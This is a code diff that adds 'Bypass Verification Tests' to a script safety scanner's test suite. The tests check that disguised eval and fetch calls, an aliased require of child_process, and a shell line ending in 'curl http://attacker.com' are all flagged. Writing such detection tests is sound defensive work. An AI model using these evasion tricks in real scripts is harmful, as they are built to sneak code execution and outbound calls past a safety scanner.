@@ -292,5 +292,38 @@ describe("Script Behavioral Scanner", () => {
       expect(result.valid).toBe(true);
       expect(result.errors).toHaveLength(0);
     });
+
+    describe("Bypass Verification Tests", () => {
+      it("globalThis/window member access bypasses", () => {
+        const code1 = "globalThis.eval('2+2');";
+        const result1 = scanScriptSafety("script.js", code1);
+        expect(result1.valid).toBe(false);
+        expect(result1.errors.some(e => e.message.includes("eval"))).toBe(true);
+
+        const code2 = "window.fetch('http://malicious.com');";
+        const result2 = scanScriptSafety("script.js", code2);
+        expect(result2.valid).toBe(false);
+        expect(result2.errors.some(e => e.message.includes("fetch"))).toBe(true);
+
+        const code3 = "globalThis['eval']('2+2');";
+        const result3 = scanScriptSafety("script.js", code3);
+        expect(result3.valid).toBe(false);
+        expect(result3.errors.some(e => e.message.includes("eval"))).toBe(true);
+      });
+
+      it("indirect require bypasses", () => {
+        const code = "const r = require; r('child_process');";
+        const result = scanScriptSafety("script.js", code);
+        expect(result.valid).toBe(false);
+        expect(result.errors.some(e => e.message.includes("require"))).toBe(true);
+      });
+
+      it("shell base representation comment truncation bypasses", () => {
+        const code = "echo $((2#1010)) ; curl http://attacker.com";
+        const result = scanScriptSafety("script.sh", code);
+        expect(result.valid).toBe(false);
+        expect(result.errors.some(e => e.message.includes("curl"))).toBe(true);
+      });
+    });
   });
 });
